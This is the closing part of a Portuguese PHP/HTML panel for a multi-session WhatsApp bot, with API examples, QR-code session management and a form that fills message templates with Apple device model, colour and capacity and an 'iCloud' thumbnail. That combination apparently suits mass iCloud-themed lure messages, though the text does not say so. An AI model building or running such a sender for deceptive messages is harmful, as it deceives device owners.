                         <h6 class="text-info fw-bold mb-3"><i class="fab fa-php me-2"></i> Exemplo Prático (Listener PHP):</h6>
                         <div style="background: rgba(255,255,255,0.03); padding: 15px; border-radius: 12px;">
                            <pre class="mb-0 text-info" style="font-size: 0.9rem; line-height: 1.6; color: #a5d6ff; white-space: pre-wrap;">&lt;?php
// RECEBENDO OS DADOS DO BOT
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if ($data) {
    $sessao   = $data['session'];
    $remetente = $data['from'];
    $mensagem  = $data['message'];
    $nome      = $data['pushName'];
    
    // Log de exemplo (mensagens_recebidas.log)
    $log = "[" . date('Y-m-d H:i:s') . "] Msg de $nome: $mensagem\n";
    file_put_contents('webhook.log', $log, FILE_APPEND);
    
    // Resposta de Sucesso
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success']);
}
?&gt;</pre>
                         </div>
                      </div>
                   </div>
                </div>
             </div>

             <!-- Tab: Exemplos -->
             <div class="tab-pane fade" id="tab-examples">
                <div class="d-flex align-items-center mb-4">
                   <h4 class="fw-bold mb-0">Exemplos Completos de Integração</h4>
                </div>
                
                <!-- Exemplo 1: CURL -->
                <div class="mb-5">
                   <h6 class="fw-bold text-primary mb-3" style="font-size: 1.1rem;"><i class="fas fa-terminal me-2"></i>1. TESTE RÁPIDO (CURL / TERMINAL)</h6>
                   <div class="bg-black p-4 rounded-4 border border-white border-opacity-10 shadow-lg">
                      <pre class="bg-transparent p-0 m-0 text-primary" style="font-size: 0.9rem; line-height: 1.6; white-space: pre-wrap;">curl -X POST http://localhost:3000/api/send-message \
  -H "Authorization: Bearer SUA_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{ "session": "vendas", "number": "5511999998888", "message": "Oi!" }'</pre>
                   </div>
                </div>

                <!-- Exemplo 2: Multi-Sessão PHP -->
                <div class="mb-5">
                   <h6 class="fw-bold text-primary mb-3" style="font-size: 1.1rem;"><i class="fab fa-php me-2"></i>2. CONEXÃO DINÂMICA (QR CODE POR CLIENTE)</h6>
                   <p class="text-white-50 mb-3" style="font-size: 0.9rem;">Essencial para que cada cliente do seu painel tenha sua própria instância:</p>
                   <div class="bg-black p-4 rounded-4 border border-white border-opacity-10 shadow-lg mb-3">
                      <pre class="bg-transparent p-0 m-0 text-info" style="font-size: 0.9rem; line-height: 1.6; color: #a5d6ff; white-space: pre-wrap;">&lt;?php
$api_url = "http://localhost:3000";
$api_key = "SUA_API_KEY";

// Dica: Você pode receber o ID do cliente via URL ex: ?cliente=Teste10
$user_id = isset($_GET['cliente']) ? preg_replace('/[^A-Za-z0-9]/', '', $_GET['cliente']) : "882"; 
$session = "User_Session_" . $user_id; 

// 🔵 PASSO 1: CRIAR/ATIVAR INSTÂNCIA
$ch = curl_init("$api_url/api/create-session");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(['session' => $session]));
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Authorization: Bearer $api_key", "Content-Type: application/json"]);
curl_exec($ch);

// 🔵 PASSO 2: CHECAR STATUS E GERAR QR CODE
$status_raw = file_get_contents("$api_url/api/status/$session", false, stream_context_create([
    'http' => ['header' => "Authorization: Bearer $api_key"]
]));
$data = json_decode($status_raw, true);
$status = $data['status'] ?? 'offline';

if ($status === 'waiting_qr') {
    $qr_raw = file_get_contents("$api_url/api/qrcode/$session", false, stream_context_create([
        'http' => ['header' => "Authorization: Bearer $api_key"]
    ]));
    $qr_data = json_decode($qr_raw, true);
    echo "&lt;img src='{$qr_data['qr']}' style='width:250px; border: 10px solid white; border-radius: 15px;'&gt;";
} elseif ($status === 'connected') {
    echo "✅ WhatsApp Conectado!";
}
?&gt;</pre>
                   </div>
                   <div class="alert alert-info bg-info bg-opacity-10 border-0 rounded-4">
                      <i class="fas fa-lightbulb me-2"></i> <b>Dica Pro:</b> Use <code>&lt;meta http-equiv="refresh" content="5"&gt;</code> no seu HTML para atualizar o QR code automaticamente até conectar.
                   </div>
                </div>

                <!-- Exemplo 3: Envio de Mensagem PHP -->
                <div class="mb-5">
                   <h6 class="fw-bold text-primary mb-3" style="font-size: 1.1rem;"><i class="fas fa-paper-plane me-2"></i>3. DISPARO DE MENSAGEM (PHP + TEMPLATES)</h6>
                   <div class="bg-black p-4 rounded-4 border border-white border-opacity-10 shadow-lg">
                      <pre class="bg-transparent p-0 m-0 text-success" style="font-size: 0.9rem; line-height: 1.6; white-space: pre-wrap;">&lt;?php
$ch = curl_init('http://localhost:3000/api/send-message');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Authorization: Bearer SUA_API_KEY',
    'Content-Type: application/json'
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
    'session' => 'vendas',
    'number'  => '5511999998888',
    'message' => 'Oi!',
    'option'  => 1 // 🔥 ATENÇÃO: Use 'option' para enviar com template e miniatura do iCloud
]));
$response = curl_exec($ch);
echo $response;
?&gt;</pre>
                   </div>
                </div>

                <!-- Exemplo 4: Controle de Pausa/Play PHP -->
                <div class="mb-4">
                   <h6 class="fw-bold text-primary mb-3" style="font-size: 1.1rem;"><i class="fas fa-pause-circle me-2"></i>4. CONTROLE DE ATENDIMENTO (PAUSAR / DAR PLAY)</h6>
                   <p class="text-white-50 mb-3" style="font-size: 0.9rem;">Ideal para sistemas que precisam interromper a automação temporariamente para um cliente específico:</p>
                   <div class="bg-black p-4 rounded-4 border border-white border-opacity-10 shadow-lg">
                      <pre class="bg-transparent p-0 m-0 text-warning" style="font-size: 0.9rem; line-height: 1.6; white-space: pre-wrap;">&lt;?php
$ch = curl_init('http://localhost:3000/api/control/pause');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Authorization: Bearer SUA_API_KEY',
    'Content-Type: application/json'
]);

// Para PAUSAR use 'pause' => true
// Para DAR PLAY use 'pause' => false
$payload = [
    'number' => '5511999998888',
    'pause'  => true 
];

curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
$response = curl_exec($ch);
echo $response; // Retorna {"success":true, "message":"Status alterado"}
?&gt;</pre>
                   </div>
                </div>
             </div>
             </div>

          </div>
        </div>
      </div>
    </div>
  </div>
</div>
<div class="modal fade" id="deviceManagerModal" tabindex="-1">
  <div class="modal-dialog modal-xl modal-dialog-centered">
    <div class="modal-content border-0 overflow-hidden shadow-2xl">
      <div class="modal-body p-0">
        <div class="row g-0">
            <!-- Sidebar: Lista de Dispositivos -->
            <div class="col-md-4 device-sidebar">
                <div class="sidebar-header">
                    <div class="d-flex justify-content-between align-items-center mb-3">
                        <h6 class="fw-bold mb-0"><i class="fas fa-layer-group me-2 text-primary"></i> Instâncias</h6>
                        <button class="btn btn-modern-icon btn-outline-light border-0" onclick="refreshSessions()"><i class="fas fa-redo-alt fa-xs"></i></button>
                    </div>

                    <div class="mb-3">
                        <label class="small text-uppercase fw-bold text-muted mb-2 px-1" style="font-size: 0.65rem; letter-spacing: 0.05em;">+ Nova Conexão</label>
                        <div class="input-group input-group-sm bg-primary rounded-3 p-1 shadow-sm">
                            <input type="text" id="new-device-id" class="form-control bg-transparent border-0 shadow-none text-white placeholder-white" placeholder="Nome da instância">
                            <button class="btn btn-white border-0 fw-bold px-3 ms-1 rounded-2" onclick="createNewSession()">CRIAR</button>
                        </div>
                    </div>

                    <div class="input-group input-group-sm bg-dark rounded-3 p-1" style="border: 1px solid var(--border);">
                        <span class="input-group-text bg-transparent border-0 text-muted"><i class="fas fa-search"></i></span>
                        <input type="text" id="device-search" class="form-control bg-transparent border-0 shadow-none text-white" placeholder="Filtrar instâncias...">
                    </div>
                </div>
                
                <div class="device-list-container" id="sessions-list">
                    <!-- List items injected here -->
                </div>
            </div>

            <!-- Content Area: Detail / QR -->
            <div class="col-md-8 p-0 d-flex flex-column bg-bg">
                <div class="p-4 d-flex justify-content-between align-items-center border-bottom" style="border-color: var(--border) !important; background: rgba(30, 41, 59, 0.2);">
                    <div id="selected-device-title">
                        <h5 class="fw-bold mb-0">Gestão de Instância</h5>
                        <p class="small text-muted mb-0">Selecione um aparelho na lateral</p>
                    </div>
                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                </div>

                <div class="p-5 flex-grow-1 overflow-auto d-flex align-items-center justify-content-center">
                    
                    <div id="qr-pane-empty" class="text-center opacity-50">
                        <div class="mb-4">
                            <i class="fas fa-qrcode fa-5x mb-3 text-primary"></i>
                        </div>
                        <h4 class="fw-bold text-white">Pronto para Conectar</h4>
                        <p class="text-muted">Escolha um aparelho para ver as opções de conexão e configurações.</p>
                    </div>

                    <div id="qr-pane-active" style="display: none; width: 100%; max-width: 450px;">
                        
                        <div class="qr-station text-center mb-4">
                            <!-- QR Content -->
                            <div id="pane-qr-container" style="display: none;">
                                <div class="bg-white p-3 rounded-4 mx-auto mb-3 shadow-glow" style="width: 200px; height: 200px;">
                                    <img id="pane-qr-img" src="" class="img-fluid">
                                </div>
                                <h6 class="text-white fw-bold">Escaneie pelo WhatsApp</h6>
                                <p class="small text-muted">Abra Dispositivos Conectados e aponte a câmera</p>
                            </div>

                            <!-- Connected Success State -->
                            <div id="pane-connected-info" style="display: none;">
                                <div class="bg-success-subtle text-success mx-auto mb-3 border border-success rounded-circle" style="width: 100px; height: 100px; display: flex; align-items: center; justify-content: center;">
                                    <i class="fas fa-check-double fa-3x"></i>
                                </div>
                                <h4 class="fw-bold text-success mb-2">Sincronizado!</h4>
                                <p class="mb-0" id="pane-connected-number"></p>
                                <span class="badge bg-success-subtle text-success border border-success mt-2">MULTIDEVICE V2</span>
                            </div>

                            <!-- Loading State -->
                            <div id="pane-loading" style="display: none;">
                                <div class="spinner-border text-primary mb-3" role="status" style="width: 4rem; height: 4rem; border-width: 0.3em;"></div>
                                <p class="h5 fw-bold text-white">Processando...</p>
                                <p class="text-muted small">Aguardando resposta do servidor</p>
                            </div>
                        </div>

                        <div class="card bg-dark border p-3 border-opacity-10 mb-4 rounded-4" style="background: rgba(0,0,0,0.2) !important;">
                            <div class="d-flex align-items-center">
                                <div class="p-2 bg-primary bg-opacity-10 rounded-3 me-3">
                                    <i class="fas fa-info-circle text-primary"></i>
                                </div>
                                <div>
                                    <div class="small text-muted">Nome da Instância</div>
                                    <div class="fw-bold text-white h6 mb-0" id="detail-id">---</div>
                                </div>
                                <div class="ms-auto">
                                    <span class="badge bg-secondary" id="detail-status">---</span>
                                </div>
                            </div>
                        </div>

                        <div class="d-flex gap-2">
                            <button id="pane-btn-qr" class="btn btn-primary flex-grow-1 p-3 fw-bold rounded-3" onclick="showQrForSelected()">GERAR NOVO QR</button>
                            <button class="btn btn-danger p-3 rounded-3" title="Excluir" onclick="deleteSelectedSession()">
                                <i class="fas fa-trash-alt"></i>
                            </button>
                        </div>

                    </div>
                </div>
            </div>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- /Gestão de Aparelhos Modal -->

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
const hostAtual = window.location.hostname;
const API_URL = (hostAtual === 'localhost' || hostAtual === '127.0.0.1') 
    ? 'http://localhost:3000' 
    : 'api/proxy.php?path=';
let API_TOKEN = '';

// --- Funções Globais API Pro (Escopo Root) ---

function setupApiAuth(token) {
    API_TOKEN = token;
    $.ajaxSetup({
        beforeSend: function(xhr, settings) {
            if (settings.url.startsWith(API_URL)) {
                xhr.setRequestHeader('Authorization', 'Bearer ' + API_TOKEN);
            }
        }
    });
    if (typeof refreshSessions === 'function') refreshSessions();
}

const apiModal = document.getElementById('apiIntegrationModal');
if(apiModal) {
    apiModal.addEventListener('shown.bs.modal', loadApiData);
}

function loadApiData() {
    console.log('[API Pro] Carregando dados...');
    $.post('api_actions.php', { action: 'get_data' }, function(res) {
        if(res.keys) {
            let html = '';
            res.keys.forEach(k => {
                html += `
                    <tr>
                        <td>${k.nome}</td>
                        <td class="font-monospace"><span class="blur-text">${k.chave}</span></td>
                        <td class="small">${new Date(k.created_at).toLocaleDateString()}</td>
                        <td class="text-end">
                            <button class="btn btn-sm btn-outline-primary" onclick="copyKey('${k.chave}')"><i class="fas fa-copy"></i></button>
                            <button class="btn btn-sm btn-outline-danger" onclick="revokeKey(${k.id})"><i class="fas fa-trash"></i></button>
                        </td>
                    </tr>
                `;
            });
            $('#api-keys-list').html(html || '<tr><td colspan="4" class="text-center text-muted">Nenhuma chave gerada.</td></tr>');
        }
        if(res.config) {
            $('#api-webhook-url').val(res.config.webhook_url);
        }
    }, 'json').fail(err => console.error('[API Pro] Erro ao carregar dados:', err));
}

function generateNewKey() {
    const nome = prompt('Dê um nome para esta chave (ex: Loja Virtual):', 'Minha API Key');
    if(!nome) return;
    $.post('api_actions.php', { action: 'generate_key', nome: nome }, function(res) {
        if(res.success) {
            Swal.fire('Sucesso!', 'Nova chave gerada com sucesso.', 'success').then(() => {
                loadApiData(); // Recarrega a lista imediatamente
            });
        } else {
            Swal.fire('Erro!', res.error || 'Falha ao gerar chave.', 'error');
        }
    }, 'json');
}

function revokeKey(id) {
    if(!confirm('Tem certeza que deseja revogar esta chave? Ela deixará de funcionar imediatamente.')) return;
    $.post('api_actions.php', { action: 'revoke_key', id: id }, function(res) {
        if(res.success) {
            loadApiData();
        } else {
            Swal.fire('Erro!', res.error || 'Falha ao revogar chave.', 'error');
        }
    }, 'json');
}

function saveApiWebhook() {
    const url = $('#api-webhook-url').val();
    $.post('api_actions.php', { action: 'save_webhook', url: url }, function(res) {
        if(res.success) {
            Swal.fire('Salvo!', 'Webhook configurado com sucesso.', 'success');
        } else {
            Swal.fire('Erro!', res.error || 'Falha ao salvar webhook.', 'error');
        }
    }, 'json');
}

function copyKey(key) {
    navigator.clipboard.writeText(key).then(() => {
        Swal.fire({
            icon: 'success',
            title: 'Copiado!',
            text: 'Chave copiada para a área de transferência.',
            timer: 1500,
            showConfirmButton: false
        });
    });
}

function copyFullDocRaw() {
    const spec = document.getElementById('full-api-spec');
    spec.select();
    document.execCommand('copy');
    Swal.fire('Copiado!', 'Documentação RAW copiada com sucesso para facilitar sua integração rápida.', 'success');
}

// --- Funções Legadas de Atividade (Restauradas) ---

window.deleteOrder = function(id, numero) {
    if(!confirm('Deseja realmente remover este registro de atividade?')) return;
    $.post('api/delete_order.php', { id: id, numero: numero }, function(res) {
        if(res.status === 'success') {
            Swal.fire('Sucesso!', res.message, 'success').then(() => location.reload());
        } else {
            Swal.fire('Erro!', res.message, 'error');
        }
    }, 'json');
}

window.togglePause = function(id, numero, status) {
    $.post('api/toggle_pause.php', { id: id, numero: numero, status: status }, function(res) {
        if(res.status === 'success') {
            Swal.fire('Sucesso!', res.message, 'success').then(() => location.reload());
        } else {
            Swal.fire('Erro!', res.message, 'error');
        }
    }, 'json');
}

$(document).ready(function() {
    // Buscar a primeira chave disponível do usuário ao carregar
    $.post('api_actions.php', { action: 'get_data' }, function(res) {
        if(res.keys && res.keys.length > 0) {
            setupApiAuth(res.keys[0].chave);
        } else {
            console.warn('Nenhuma API Key encontrada. Algumas funções podem ser limitadas.');
            if (typeof refreshSessions === 'function') refreshSessions();
        }
    }).fail(function() {
        console.error('Falha ao buscar chaves de API.');
        if (typeof refreshSessions === 'function') refreshSessions();
    });
    const mapModelCapacities = <?php echo json_encode([
        "iPhone 8" => ["64 GB", "128 GB", "256 GB"], "iPhone 8 Plus" => ["64 GB", "128 GB", "256 GB"],
        "iPhone X" => ["64 GB", "256 GB"], "iPhone XR" => ["64 GB", "128 GB", "256 GB"],
        "iPhone XS" => ["64 GB", "256 GB", "512 GB"], "iPhone XS Max" => ["64 GB", "256 GB", "512 GB"],
        "iPhone 11" => ["64 GB", "128 GB", "256 GB"], "iPhone 11 Pro" => ["64 GB", "256 GB", "512 GB"],
        "iPhone 11 Pro Max" => ["64 GB", "256 GB", "512 GB"], "iPhone SE (2ª Geração)" => ["64 GB", "128 GB", "256 GB"],
        "iPhone 12" => ["64 GB", "128 GB", "256 GB"], "iPhone 12 mini" => ["64 GB", "128 GB", "256 GB"],
        "iPhone 12 Pro" => ["128 GB", "256 GB", "512 GB"], "iPhone 12 Pro Max" => ["128 GB", "256 GB", "512 GB"],
        "iPhone 13" => ["128 GB", "256 GB", "512 GB"], "iPhone 13 mini" => ["128 GB", "256 GB", "512 GB"],
        "iPhone 13 Pro" => ["128 GB", "256 GB", "512 GB", "1 TB"], "iPhone 13 Pro Max" => ["128 GB", "256 GB", "512 GB", "1 TB"],
        "iPhone 14" => ["128 GB", "256 GB", "512 GB"], "iPhone 14 Plus" => ["128 GB", "256 GB", "512 GB"],
        "iPhone 14 Pro" => ["128 GB", "256 GB", "512 GB", "1 TB"], "iPhone 14 Pro Max" => ["128 GB", "256 GB", "512 GB", "1 TB"],
        "iPhone 15" => ["128 GB", "256 GB", "512 GB"], "iPhone 15 Plus" => ["128 GB", "256 GB", "512 GB"],
        "iPhone 15 Pro" => ["128 GB", "256 GB", "512 GB", "1 TB"], "iPhone 15 Pro Max" => ["128 GB", "256 GB", "512 GB", "1 TB"],
        "iPhone 16" => ["128 GB", "256 GB", "512 GB", "1 TB"], "iPhone 16 Plus" => ["128 GB", "256 GB", "512 GB", "1 TB"],
        "iPhone 16 Pro" => ["128 GB", "256 GB", "512 GB", "1 TB"], "iPhone 16 Pro Max" => ["128 GB", "256 GB", "512 GB", "1 TB"],
        "MacBook Air" => ["256 GB", "512 GB", "1 TB", "2 TB"], "MacBook Pro" => ["512 GB", "1 TB", "2 TB", "4 TB", "8 TB"]
    ]); ?>;

    const mapModelColors = <?php echo json_encode([
        "iPhone 11" => ["Preto", "Verde", "Amarelo", "Roxo", "Branco", "Vermelho"],
        "iPhone 12" => ["Preto", "Branco", "Azul", "Verde", "Roxo", "Vermelho"],
        "iPhone 13" => ["Meia-Noite", "Estelar", "Azul", "Rosa", "Verde", "Vermelho"],
        "iPhone 14" => ["Meia-Noite", "Estelar", "Azul", "Roxo", "Amarelo", "Vermelho"],
        "iPhone 15" => ["Preto", "Azul", "Verde", "Amarelo", "Rosa"],
        "iPhone 15 Pro" => ["Titânio Natural", "Titânio Azul", "Titânio Branco", "Titânio Preto"],
        "iPhone 16" => ["Ultramarine", "Teal", "Rosa", "Branco", "Preto"],
        "iPhone 16 Pro" => ["Titânio Preto", "Titânio Branco", "Titânio Natural", "Titânio Deserto"],
        "iPhone 7" => ["Preto", "Prata", "Ouro", "Ouro Rosa", "Preto Brilhante", "Vermelho"],
        "iPhone 7 Plus" => ["Preto", "Prata", "Ouro", "Ouro Rosa", "Preto Brilhante", "Vermelho"],
        "iPad Air" => ["Cinza Espacial", "Estelar", "Rosa", "Roxo", "Azul"],
        "MacBook Air" => ["Prata", "Estelar", "Cinza Espacial", "Meia-Noite"]
    ]); ?>;

    const baseTexts = <?php echo json_encode($baseTexts); ?>;
    
    // Todas as opções do banco de dados para fallback
    const allCapacities = <?php echo json_encode(array_column($capacidades, 'nome')); ?>;
    const allColors = <?php echo json_encode(array_column($cores, 'nome')); ?>;

    // Dinâmica de formulário
    $('#select-modelo').change(function() {
        let modelo = $(this).val();
        let capSelect = $('#select-capacidade').empty().append('<option value="">Selecione...</option>');
        let corSelect = $('#select-cor').empty().append('<option value="">Selecione...</option>');
        
        if (mapModelCapacities[modelo]) {
            mapModelCapacities[modelo].forEach(c => capSelect.append(new Option(c, c)));
        } else if (modelo !== "") {
            // Fallback: Mostrar todas se não houver mapeamento específico
            allCapacities.forEach(c => capSelect.append(new Option(c, c)));
        }

        if (mapModelColors[modelo]) {
            mapModelColors[modelo].forEach(c => corSelect.append(new Option(c, c)));
        } else if (modelo !== "") {
            // Fallback: Mostrar todas se não houver mapeamento específico
            allColors.forEach(c => corSelect.append(new Option(c, c)));
        }
        updatePreview();
    });

    $('#select-idioma').change(function() {
        const lang = $(this).val();
        if (baseTexts[lang]) $('#texto-base').val(baseTexts[lang]);
        updatePreview();
    });

    function updatePreview() {
        let text = $('#texto-base').val() || '';
        let replaced = text.replace(/{modelo}/g, $('#select-modelo').val() || '{modelo}')
                           .replace(/{cor}/g, $('#select-cor').val() || '{cor}')
                           .replace(/{capacidade}/g, $('#select-capacidade').val() || '{capacidade}');
        $('#preview-text').text(replaced);
    }

    $('select[name="image_gallery"]').change(function() {
        let val = $(this).val();
        if(val) { $('#preview-image').attr('src', val); $('#preview-image-container').show(); }
        else { $('#preview-image-container').hide(); }
    }).trigger('change');

    $('#texto-base, #select-modelo, #select-cor, #select-capacidade').on('input change', updatePreview);
    updatePreview();

    // AJAX de Envio
    $('#sendForm').submit(function(e) {
        e.preventDefault();
        let btn = $('#btn-submit');
        let originalText = btn.html();
        btn.html('<i class="fas fa-spinner fa-spin me-2"></i> PROCESSANDO DISPARO...').prop('disabled', true);
        
        $.ajax({
            url: 'api/send_media.php',
            type: 'POST',
            data: new FormData(this),
            contentType: false,
            processData: false,
            success: function(res) {
                let r = JSON.parse(res);
                if (r.status === 'success') {
                    $('#response-alert').removeClass('alert-danger').addClass('alert-success').html('<i class="fas fa-check-circle me-2"></i> Sucesso: ' + r.message).fadeIn();
                    setTimeout(() => location.reload(), 2000);
                } else {
                    $('#response-alert').removeClass('alert-success').addClass('alert-danger').html('<i class="fas fa-times-circle me-2"></i> Erro: ' + r.message).fadeIn();
                    btn.html(originalText).prop('disabled', false);
                }
            },
            error: function() {
                $('#response-alert').addClass('alert-danger').text('Erro de conexão com o servidor local. O Bot está rodando?').fadeIn();
                btn.html(originalText).prop('disabled', false);
            }
        });
    });

    // --- Gestão de Sessões (AJAX p/ Node API) ---

    let statsInterval = setInterval(updateStats, 5000);
    updateStats();

    function updateStats() {
        $.get(API_URL + '/api/stats', function(res) {
            console.log('[API] Stats:', res);
            $('#stat-online').text(res.connected || 0);
            $('#stat-waiting').text(res.waiting || 0);
            if ($('#badge-status-wpp').length) {
                $('#badge-status-wpp').text(res.connected > 0 ? 'Sistemas Ativos' : 'Aguardando Login');
                $('#badge-status-wpp').toggleClass('bg-success', res.connected > 0).toggleClass('bg-warning', res.connected === 0);
            }
        }).fail(err => console.error('[API] Erro em updateStats:', err));
    }

    let currentSelectedId = null;

    window.refreshSessions = function() {
        console.log('[API] Chamando refreshSessions...');
        $.get(API_URL + '/api/sessions', function(sessions) {
            console.log('[API] Sessions:', sessions);
            $('#sessions-list').empty();
            let selectSess = $('#select-session').empty();
            selectSess.append(new Option('Dispositivo Principal (Padrão)', 'default'));
            
            if (!sessions || sessions.length === 0) {
                $('#sessions-list').html('<div class="text-center py-5 text-muted small"><i class="fas fa-ghost fa-3x mb-3 opacity-25"></i><br>Nenhuma instância encontrada</div>');
                return;
            }

            sessions.forEach(s => {
                let statusGlow = s.status === 'connected' ? 'online' : (s.status === 'waiting_qr' || s.status === 'qr_ready' ? 'waiting' : 'offline');
                
                if (s.status === 'connected') {
                    selectSess.append(new Option(s.id + ' (' + (s.number || 'Conectado') + ')', s.id));
                }

                let isActive = currentSelectedId === s.id;
                let item = $(`
                    <div class="device-item ${isActive ? 'active' : ''}" id="item-${s.id}">
                        <div class="device-icon-wrapper">
                            <i class="fab fa-whatsapp text-success"></i>
                            <div class="status-glow ${statusGlow}"></div>
                        </div>
                        <div class="text-truncate flex-grow-1">
                            <div class="fw-bold text-white small text-truncate mb-0">${s.id}</div>
                            <div class="text-muted" style="font-size: 0.65rem;">${s.number || 'Desconectado'}</div>
                        </div>
                        <i class="fas fa-chevron-right text-muted small ms-2 opacity-25"></i>
                    </div>
                `);

                item.on('click', () => selectDevice(s));
                $('#sessions-list').append(item);

                if (isActive) updateSidePane(s);
            });
            
            filterDevices(); // Re-apply search filter
        });
    }

    // Search Filter
    $('#device-search').on('input', filterDevices);
    function filterDevices() {
        let val = $('#device-search').val().toLowerCase();
        $('.device-item').each(function() {
            let id = $(this).find('.fw-bold').text().toLowerCase();
            $(this).toggle(id.includes(val));
        });
    }

    window.selectDevice = function(session) {
        currentSelectedId = session.id;
        $('.device-item').removeClass('active');
        $(`#item-${session.id}`).addClass('active');
        updateSidePane(session);
    }

    function updateSidePane(session) {
        $('#qr-pane-empty').hide();
        $('#qr-pane-active').fadeIn(300);
        
        $('#detail-id').text(session.id);
        
        let statusMap = { 'connected': 'Ativo', 'waiting_qr': 'Aguardando QR', 'qr_ready': 'Aguardando QR', 'connecting': 'Conectando...', 'disconnected': 'Desconectado', 'offline': 'Offline' };
        let statusColor = session.status === 'connected' ? 'success' : (['waiting_qr', 'qr_ready', 'connecting'].includes(session.status) ? 'warning' : 'danger');
        
        $('#detail-status').text(statusMap[session.status] || session.status)
                         .removeClass('bg-success bg-warning bg-danger bg-secondary')
                         .addClass('bg-' + statusColor);

        $('#pane-qr-container, #pane-connected-info, #pane-loading').hide();
        $('#pane-btn-qr').show();

        if (session.status === 'connected') {
            $('#pane-connected-info').show();
            $('#pane-connected-number').html(`<i class="fas fa-phone-alt me-2 opacity-50"></i>${session.number}`);
            $('#pane-btn-qr').text('RECONECTAR');
        } else if (session.status === 'waiting_qr' || session.status === 'qr_ready') {
            $.get(API_URL + '/api/sessions/' + session.id + '/qr', function(data) {
                if (data.qr) {
                    $('#pane-qr-img').attr('src', data.qr);
                    $('#pane-qr-container').show();
                }
            });
            $('#pane-btn-qr').text('FORÇAR NOVO QR');
        } else {
            $('#pane-loading').show();
            $('#pane-btn-qr').text('GERAR CONEXÃO');
        }
    }

    window.createNewSession = function() {
        let id = $('#new-device-id').val().trim();
        if (!id) return;
        
        $('#qr-pane-empty').hide();
        $('#qr-pane-active').show();
        $('#pane-qr-container, #pane-connected-info, #pane-btn-qr').hide();
        $('#pane-loading').show();
        $('#detail-id').text(id);
        $('#detail-status').text('Criando...').addClass('bg-secondary');

        $.ajax({
            url: API_URL + '/api/sessions',
            type: 'POST',
            data: JSON.stringify({ sessionId: id }),
            contentType: 'application/json',
            success: function() {
                $('#new-device-id').val('');
                currentSelectedId = id;
                refreshSessions();
            }
        });
    }

    window.showQrForSelected = function() {
        if (!currentSelectedId) return;
        $('#pane-qr-container, #pane-connected-info, #pane-btn-qr').hide();
        $('#pane-loading').show();
        
        $.ajax({
            url: API_URL + '/api/sessions',
            type: 'POST',
            data: JSON.stringify({ sessionId: currentSelectedId }),
            contentType: 'application/json',
            success: function() {
                refreshSessions();
            }
        });
    }

    window.deleteSelectedSession = function() {
        if (!currentSelectedId || !confirm(`Deseja realmente remover permanentemente a instância "${currentSelectedId}"?`)) return;
        
        $.ajax({
            url: API_URL + '/api/sessions/' + currentSelectedId,
            type: 'DELETE',
            success: function() {
                currentSelectedId = null;
                $('#qr-pane-active').hide();
                $('#qr-pane-empty').show();
                refreshSessions();
            }
        });
    }

    let sessionPoll = null;
    $('#deviceManagerModal').on('show.bs.modal', function() {
        refreshSessions();
        sessionPoll = setInterval(refreshSessions, 3000);
    }).on('hide.bs.modal', function() {
        clearInterval(sessionPoll);
    });

    // --- Funções de Controle de Atividade ---
    
    window.togglePause = function(id, numero, status) {
        $.post('api/toggle_pause.php', { id: id, numero: numero, status: status }, function(res) {
            let r = JSON.parse(res);
            if (r.status === 'success') {
                location.reload();
            } else {
                alert('Erro ao alterar status: ' + r.message);
            }
        });
    }

    window.deleteOrder = function(id, numero) {
        if (!confirm('Deseja realmente remover este registro e limpar a memória do robô para este número?')) return;
        $.post('api/delete_order.php', { id: id, numero: numero }, function(res) {
            let r = JSON.parse(res);
            if (r.status === 'success') {
                location.reload();
            } else {
                alert('Erro ao excluir: ' + r.message);
            }
        });
    }

    window.clearBotMemory = function() {
        if (!confirm('ATENÇÃO: Isso irá apagar TODO o histórico de mensagens e limpar a memória de todos os números no robô. Continuar?')) return;
        
        let btn = $('.btn-outline-danger.btn-sm');
        let originalText = btn.html();
        btn.html('<i class="fas fa-spinner fa-spin me-1"></i> Zerando...').prop('disabled', true);

        $.post('api/clear_memory.php', function(res) {
            let r = JSON.parse(res);
            if (r.status === 'success') {
                alert(r.message);
                location.reload();
            } else {
                alert('Erro ao zerar robô: ' + r.message);
                btn.html(originalText).prop('disabled', false);
            }
        });
    }

    // Eventos herdados
    $('#device-search').on('input', filterDevices);

    // Ajuste dinâmico da documentação conforme o ambiente
    if (window.location.hostname !== 'localhost' && window.location.hostname !== '127.0.0.1') {
        const remoteUrl = window.location.origin + '/api/proxy.php?path=';
        $('#doc-base-url-1, #doc-base-url-2').text(remoteUrl);
    }
});
</script>
</body>
</html>
